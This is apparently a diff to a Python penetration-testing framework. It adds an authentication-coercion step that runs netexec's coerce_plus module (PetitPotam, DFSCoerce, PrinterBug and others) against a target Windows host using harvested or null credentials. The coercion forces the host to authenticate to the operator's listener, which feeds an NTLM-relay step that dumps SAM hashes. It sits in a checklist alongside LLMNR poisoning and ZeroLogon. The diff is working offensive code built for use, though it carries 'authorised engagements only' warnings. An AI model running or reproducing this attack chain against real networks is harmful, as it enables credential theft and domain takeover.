@@ -2223,6 +2223,14 @@ def _extract_finding(sid: str, output: str) -> "dict | None":
                     "summary": f"SMB readable shares: {len(files)} sensitive file(s)"[:140]}
         return None
 
+    # 2ah) smb-coerce: target coercible into authenticating to us → drives the relay
+    if sid == "smb-coerce":
+        hits = re.findall(r"^✗ COERCE (.+)$", output, re.M)
+        if not hits:
+            return None
+        return {"state": "EXPOSED", "cve": cve, "risk": "HIGH",
+                "summary": f"coercible: {', '.join(h.strip() for h in hits[:5])}"[:140]}
+
     # 2ag) smb-relay: NTLM relayed to a signing-off host → SAM hashes dumped remotely
     if sid == "smb-relay":
         hits = re.findall(r"^✗ SAM (.+)$", output, re.M)
@@ -2886,7 +2894,7 @@ _EXPLOIT_STEPS = {
         # ── poison & relay (no creds) ──
         ("Poison LLMNR / NBT-NS → capture NetNTLM", "smb-poison"),
         ("NTLM relay (signing not required)", "smb-relay"),
-        "Coerce auth → relay to escalate",
+        ("Coerce auth → relay to escalate", "smb-coerce"),
         # ── DC-critical CVEs ──
         "DC CVEs: ZeroLogon, noPac",
         # ── creds → exec / dump ──
@@ -9209,6 +9217,63 @@ def _tool_smb_relay(ip: str, port: int, proto: str) -> str:
     return f"NTLM relay → SAM — {len(targets)} target(s)  (active, timed)\n\n" + "\n".join(lines)
 
 
+# ── SMB step 7: authentication coercion → drive the relay ──────────────────────
+_SMBCOERCE_DEADLINE = 180        # s — overall cap across auth attempts
+_COERCE_METHODS = ("Petitpotam", "DFSCoerce", "ShadowCoerce", "Printerbug", "MSEven")
+
+
+def _tool_smb_coerce(ip: str, port: int, proto: str) -> str:
+    """SMB step 7 tool: coerce the target (a DC / Windows host) into authenticating back to
+    our listener via netexec's coerce_plus (PetitPotam / DFSCoerce / ShadowCoerce / PrinterBug
+    / MS-EVEN). This is the DRIVER for the relay — it captures nothing itself; the loot lands
+    at the relay (step 6) or the poisoner (step 5), which must already be running. Target-
+    scoped (this host), fires toward our source IP. Tries harvested creds then null. No root
+    needed (outbound RPC). A missing netexec or an unreachable target raises. Authorised
+    internal engagements ONLY."""
+    import time
+    nxc = shutil.which("netexec") or shutil.which("nxc")
+    if not nxc:
+        raise RuntimeError("netexec not found — install it to coerce authentication")
+    lhost = _foothold_lhost(ip)
+    if not lhost:
+        raise RuntimeError(f"could not determine our source IP toward {ip} (LISTENER for coercion)")
+    deadline = time.time() + _SMBCOERCE_DEADLINE
+
+    methods, used, reached, authed = set(), None, False, False
+    for dom, user, pw, label in _smb_gpp_attempts(ip, port, proto):
+        if time.time() > deadline:
+            break
+        base = [nxc, "smb", ip] + _smb_auth_nxc(dom, user, pw)
+        _, out = _smb_run(base + ["-M", "coerce_plus", "-o", f"LISTENER={lhost}", "METHOD=All"], 90)
+        if re.search(r"\b445\b", out):
+            reached = True
+        ok = bool(re.search(r"\b445\b.*\[\+\]", out))
+        for ln in out.splitlines():
+            for meth in _COERCE_METHODS:
+                if (meth.lower() in ln.lower()
+                        and re.search(r"vulnerable|success|coerc|\[\+\]", ln, re.I)
+                        and not re.search(r"not vulnerable|fail|error|\[-\]", ln, re.I)):
+                    methods.add(meth)
+        if ok:
+            authed, used = True, label
+            break                                 # a session that authenticates is enough
+    if not reached:
+        raise RuntimeError(f"{ip}:{port} did not answer the coercion attempt (unreachable / not SMB?)")
+
+    lines = [f"[*] Target: {ip}   LISTENER: {lhost}   Auth: {used or 'null / none accepted'}"]
+    for meth in sorted(methods):
+        lines.append(f"✗ COERCE {meth}")
+    if methods:
+        lines.append("· fired METHOD=All toward the listener — run relay (r6) or poison (r5) "
+                     "to catch the callback")
+    elif authed:
+        lines.append("· coercion fired (All) — check the listener (r6/r5) for the relayed/captured auth")
+    else:
+        lines.append("· no session accepted — coercion needs valid domain creds "
+                     "(smb-loot r3 / smb-gpp r4) or an unauth PetitPotam")
+    return f"Auth coercion — {ip}  (trigger → LISTENER {lhost})\n\n" + "\n".join(lines)
+
+
 # tool key -> (short label shown in the checklist, runner(ip, port, proto) -> output str)
 _STEP_TOOLS = {
     "http-headers": ("HTTP headers (stdlib, no redirects)", _tool_http_headers),
@@ -9244,6 +9309,7 @@ _STEP_TOOLS = {
     "smb-gpp": ("SYSVOL/NETLOGON GPP loot (netexec + smbclient, creds-aware, DC)", _tool_smb_gpp),
     "smb-poison": ("LLMNR/NBT-NS poisoning → NetNTLM capture (Responder, timed, root)", _tool_smb_poison),
     "smb-relay": ("NTLM relay → SAM dump (ntlmrelayx, signing-off targets, timed, root)", _tool_smb_relay),
+    "smb-coerce": ("Auth coercion (netexec coerce_plus → drives relay/poison)", _tool_smb_coerce),
 }
 
 def _mins(seconds: int) -> str:
@@ -9294,6 +9360,7 @@ _STEP_TOOL_RUNS = {
     "smb-gpp":          ("netexec + smbclient", f"{_mins(_SMBGPP_DEADLINE)} min"),
     "smb-poison":       ("Responder", f"{_mins(_SMBPOISON_DEADLINE)} min"),
     "smb-relay":        ("ntlmrelayx", f"{_mins(_SMBRELAY_DEADLINE)} min"),
+    "smb-coerce":       ("netexec coerce_plus", f"{_mins(_SMBCOERCE_DEADLINE)} min"),
 }
 
 
@@ -9455,6 +9522,12 @@ def _run_step_tool(ip: str, target: tuple, n: int) -> None:
         print(f"{YELLOW}   ⚠ SMB version-RCE scan{RESET}{DIM} — detection only (nmap NSE + netexec), "
               f"no exploitation / no unsafe probes · {RESET}{YELLOW}authorized targets only{RESET}"
               f"{DIM} · deadline {_SMBVULN_DEADLINE // 60} min{RESET}")
+    if tool_key == "smb-coerce":                  # driver — fires auth toward our listener
+        lh = _foothold_lhost(ip) or "<our IP>"
+        print(f"{YELLOW}   ⚠ ACTIVE auth coercion{RESET}{DIM} — forces {ip} to authenticate to "
+              f"{BOLD}{lh}{RESET}{DIM}; nothing is caught here — start {BOLD}relay r6{RESET}{DIM} / "
+              f"{BOLD}poison r5{RESET}{DIM} first · {RESET}{YELLOW}authorised internal engagements "
+              f"only{RESET}")
     if tool_key == "smb-relay":                   # active relay + remote SAM dump — loud gate
         root = f"{GREEN}root ✓{RESET}" if _is_root() else f"{RED}needs root — re-launch under sudo{RESET}"
         n = len(_gather_relay_targets())
